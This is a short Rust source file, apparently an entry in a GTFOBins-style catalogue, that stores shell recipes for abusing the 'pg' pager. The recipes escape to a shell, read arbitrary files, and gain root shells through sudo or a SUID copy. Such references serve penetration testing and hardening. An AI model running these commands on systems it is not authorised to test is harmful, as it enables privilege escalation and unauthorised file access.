pub static BIN_NAME: &'static str = "pg";
pub static SH_CODE: &'static str = r#"
    
    pg /etc/profile
    !/bin/sh
"#;
pub static FR_CODE: &'static str = r#"
    
    pg file_to_read
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which pg) .

    ./pg file_to_read
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo pg /etc/profile
    !/bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
